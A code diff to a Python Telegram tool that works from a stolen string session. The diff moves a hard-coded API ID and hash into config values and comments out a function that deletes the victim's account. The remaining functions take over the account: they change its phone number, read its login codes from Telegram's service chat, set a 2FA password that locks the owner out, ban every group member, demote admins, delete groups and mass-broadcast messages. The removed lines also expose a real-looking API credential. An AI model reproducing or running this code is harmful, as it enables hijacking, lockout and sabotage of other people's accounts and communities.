@@ -69,7 +69,7 @@ async def delvar(variable):
 
 
 async def change_number_code(strses, number, code, otp):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         bot = X
         try:
             result = await bot(
@@ -83,7 +83,7 @@ async def change_number_code(strses, number, code, otp):
 
 
 async def change_number(strses, number):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         bot = X
         result = await bot(
             functions.account.SendChangePhoneCodeRequest(
@@ -97,26 +97,27 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         k = await X.get_me()
         return str(k)
 
 
 async def terminate(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         await X(rt())
 
 
 GROUP_LIST = []
 
 
-async def delacc(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        await X(functions.account.DeleteAccountRequest("I am chutia"))
+# DESTRUCTIVE FUNCTION REMOVED FOR SAFETY
+# async def delacc(strses):
+#     async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
+#         await X(functions.account.DeleteAccountRequest("Account deletion requested"))
 
 
 async def gcast(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -135,7 +136,7 @@ async def gcast(strses, msg):
 
 
 async def promote(strses, grp, user):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             await X.edit_admin(
                 grp,
@@ -162,7 +163,7 @@ async def promote(strses, grp, user):
 
 
 async def user2fa(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             await X.edit_2fa("LEGENDBOY IS BEST")
             return True
@@ -171,7 +172,7 @@ async def user2fa(strses):
 
 
 async def gpromote(strses, user):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         try:
             i = 0
             k = await X(pc())
@@ -205,7 +206,7 @@ async def gpromote(strses, user):
 
 
 async def demall(strses, grp):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
             try:
                 await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -225,23 +226,23 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         await X(join(username))
 
 
 async def leavegroup(strses, username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         await X(leave(username))
 
 
 async def delgroup(strses, username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         await X(dc(username))
 
 
 async def cu(strses):
     try:
-        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
             k = await X.get_me()
             return [str(k.first_name), str(k.username or k.id)]
     except Exception:
@@ -261,7 +262,7 @@ async def login(strses, apiid, apihash, grp, urgrp):
 
 
 async def usermsgs(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         i = ""
         async for x in X.iter_messages(777000, limit=3):
             i += f"\n{x.text}\n"
@@ -270,7 +271,7 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         k = await X.get_participants(grp)
         for x in k:
             try:
@@ -280,7 +281,7 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), Config.APP_ID, Config.API_HASH) as X:
         k = await X(pc())
         i = ""
         for x in k.chats:
